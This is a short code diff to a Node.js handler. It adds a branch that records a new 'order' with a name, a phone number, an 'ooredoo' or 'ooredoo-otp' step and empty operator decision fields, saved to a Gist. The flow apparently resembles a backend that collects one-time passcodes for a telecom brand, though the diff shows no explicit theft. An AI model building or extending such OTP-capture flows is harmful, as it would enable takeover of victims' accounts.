@@ -141,6 +141,15 @@ module.exports = async function handler(req, res) {
           orders[idx].updated = Date.now();
           await saveToGist();
           return res.status(200).json({ ok: true, ref: o.ref });
+        } else {
+          orders.unshift({
+            ref: o.ref, status: "awaiting",
+            step: o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo",
+            ooredoo: o.ooredoo, decision: "", reason: "", next: "",
+            n: o.n || "", p: o.p || "", ts: Date.now(), updated: Date.now()
+          });
+          await saveToGist();
+          return res.status(200).json({ ok: true, ref: o.ref });
         }
       }
       if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return res.status(400).json({ ok: false, error: "invalid" });
